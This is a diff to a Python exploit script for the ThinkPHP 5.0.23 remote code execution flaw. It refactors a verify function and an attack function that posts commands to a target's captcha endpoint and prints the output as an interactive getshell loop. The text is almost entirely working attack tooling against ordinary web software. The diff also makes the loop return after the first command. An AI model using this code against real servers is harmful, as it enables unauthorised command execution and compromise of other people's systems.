@@ -22,14 +22,13 @@ def verify(url):
             relsult['url'] = target
             relsult['position'] = 'data'
             relsult['payload'] = payload
-            relsult['exp'] = True
+            relsult['attack'] = True
         return relsult
     except:
         return relsult
 
 # getshell
-def exp():
-    url = input('输入目标URL:')
+def attack(url):
     if verify(url):
         print('[+] 存在 ThinkPHP5 5.0.23 Remote Code Execution Vulnerability')
         target = url + '/index.php?s=captcha'
@@ -38,13 +37,15 @@ def exp():
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
             'Content-Type': 'application/x-www-form-urlencoded',
         }
-        while True:
-            cmd_shell = input('[+] 执行命令:')
+        cmd_shell = ''
+        print('[+] 开始执行命令, 输入exit退出')
+        while cmd_shell != 'exit':
+            cmd_shell = str(input('[+] 执行命令: '))
             payload = basic_payload.format(cmd_shell)
             response = requests.post(target, data=payload, headers=headers, timeout=3, verify=False)
             output = re.search(r'([^<]*)', response.text)[0]
-            print(response.text)
+            print('[*] 执行结果结果:', response.text)
+            return True
+    else:
+        return False
 
-
-if __name__ == '__main__':
-    exp()
